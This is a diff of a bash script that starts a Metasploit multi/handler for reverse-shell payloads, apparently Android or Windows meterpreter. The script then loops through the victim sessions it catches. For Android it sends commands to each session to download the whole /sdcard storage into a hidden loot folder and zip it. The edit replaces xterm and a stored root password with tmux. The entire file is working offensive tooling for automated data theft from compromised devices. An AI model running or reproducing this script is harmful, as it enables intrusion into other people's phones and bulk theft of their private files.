@@ -1,13 +1,13 @@
 #!/bin/bash
 
 command -v msfconsole > /dev/null 2>&1 || { echo >&2 "I require metasploit but it's not installed. Install it. Aborting."; exit 1; }
-command -v xterm > /dev/null 2>&1 || { echo >&2 "I require xterm but it's not installed. Install it. Aborting."; exit 1; }
+command -v tmux > /dev/null 2>&1 || { echo >&2 "I require tmux but it's not installed. Install it. Aborting."; exit 1; }
 command -v zip > /dev/null 2>&1 || { echo >&2 "I require zip but it's not installed. Install it. Aborting."; exit 1; }
 
 if [ $# -ne 3 ]; then
-  echo "Usage: $0 <LHOST> <LPORT> <PAYLOAD>"
-  echo "Example: $0 192.168.178.30 4444 android/meterpreter/reverse_tcp"
-  exit 1
+	echo "Usage: $0 <LHOST> <LPORT> <PAYLOAD>"
+	echo "Example: $0 192.168.178.30 4444 android/meterpreter/reverse_tcp"
+	exit 1
 fi
 
 LHOST=$1
@@ -15,62 +15,49 @@ LPORT=$2
 PAYLOAD=$3
 
 DIR=$(pwd)
+LOOT_DIR=$(pwd)/.loot
 
-read -p $"Enter root password: " SU_PASS
+[[ ! -d ${LOOT_DIR} ]] && mkdir -p ${LOOT_DIR}
 
-mkdir -p loot
-echo -ne $SU_PASS | su -c "clear"
-$(xterm -e bash -c "cd $DIR/loot; tty >$DIR/msf_tty; msfconsole -q -x 'use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set EnableStageEncoding true; exploit -j -z'") &
-sleep 1
-MSF=$(cat msf_tty)
-rm msf_tty
+tmux new-session -d -s msfpe "msfconsole -q -x 'use exploit/multi/handler; set payload ${PAYLOAD}; set LHOST ${LHOST}; set LPORT ${LPORT}; set EnableStageEncoding true; exploit -j -z'" && sleep 30
 
-run() {
-	case $PAYLOAD in
-	*"android"*)
-		while true; do
-			cd $DIR/loot
-			echo -ne $SU_PASS | su -c "clear"
-			echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF spool sessions_android.txt"
-			echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF sessions -l"
-			echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF spool off"
-			for num in $(grep -oP '^\s*\d+' sessions_android.txt | awk '{$1=$1};1'); do
-				randnum=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8)
-				mkdir -p $DIR/loot/android-$randnum
-				cd $DIR/loot/android-$randnum
-				echo -ne $SU_PASS | su -c "clear"
-				echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF sessions -i $num"
-				echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF cd /sdcard"
-				echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF download -a -c -l 0 * $DIR/loot/android-$randnum"
-				echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF background"
-			done
-			rm $DIR/loot/sessions_android.txt
-			zip -rm -9 $DIR/loot/android-$randnum.zip $DIR/loot/android-$randnum
-			echo -ne $SU_PASS | su -c "clear"
-			sleep 10
+case ${PAYLOAD} in
+*"android"*)
+	while true; do
+		cd ${LOOT_DIR}
+		tmux send-keys -t msfpe:0 "spool sessions_android.txt" C-m
+		tmux send-keys -t msfpe:0 "sessions -l" C-m
+		tmux send-keys -t msfpe:0 "spool off" C-m
+		for s in $(grep -oP '^\s*\d+' sessions_android.txt | awk '{$1=$1};1'); do
+			RANDNAME=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8)
+			mkdir -p ${LOOT_DIR}/android-${RANDNAME}
+			cd ${LOOT_DIR}/android-${RANDNAME}
+			tmux send-keys -t msfpe:0 "sessions -i ${s}" C-m
+			tmux send-keys -t msfpe:0 "cd /sdcard" C-m
+			tmux send-keys -t msfpe:0 "download -a -c -l 0 * ${LOOT_DIR}/android-${RANDNAME}" C-m
+			tmux send-keys -t msfpe:0 "background" C-m
 		done
-		;;
-	*"windows"*)
-		while true; do
-			cd $DIR/loot
-			echo -ne $SU_PASS | su -c "clear"
-			echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF spool sessions_windows.txt"
-			echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF sessions -l"
-			echo -ne $SU_PASS | su -c "$DIR/ttyecho -n $MSF spool off"
-			for num in $(grep -oP '^\s*\d+' sessions_windows.txt | awk '{$1=$1};1'); do
-				mkdir -p $DIR/loot/windows-$randnum
-				cd $DIR/loot/windows-$randnum
-				echo -ne $SU_PASS | su -c "clear"
-			done
-			rm $DIR/loot/sessions_windows.txt
-			zip -rm -9 $DIR/loot/windows-$randnum.zip $DIR/loot/windows-$randnum
-			echo -ne $SU_PASS | su -c "clear"
-			sleep 10
+		rm ${LOOT_DIR}/sessions_android.txt
+		zip -rm -9 ${LOOT_DIR}/android-${RANDNAME}.zip ${LOOT_DIR}/android-${RANDNAME}
+	done
+	;;
+*"windows"*)
+	while true; do
+		cd ${LOOT_DIR}
+		tmux send-keys -t msfpe:0 "spool sessions_windows.txt" C-m
+		tmux send-keys -t msfpe:0 "sessions -l" C-m
+		tmux send-keys -t msfpe:0 "spool off" C-m
+		for s in $(grep -oP '^\s*\d+' sessions_windows.txt | awk '{$1=$1};1'); do
+			mkdir -p ${LOOT_DIR}/windows-${RANDNAME}
+			cd ${LOOT_DIR}/windows-${RANDNAME}
+			tmux send-keys -t msfpe:0 "sessions -i ${s}" C-m
+			tmux send-keys -t msfpe:0 "background" C-m
 		done
-		;;
-	*)
-		echo "Platform not supported."
-		exit 1
-	esac
-}
-sleep 30 && run
+		rm ${LOOT_DIR}/sessions_windows.txt
+		zip -rm -9 ${LOOT_DIR}/windows-${RANDNAME}.zip ${LOOT_DIR}/windows-${RANDNAME}
+	done
+	;;
+*)
+	echo "Platform not supported."
+	exit 1
+esac
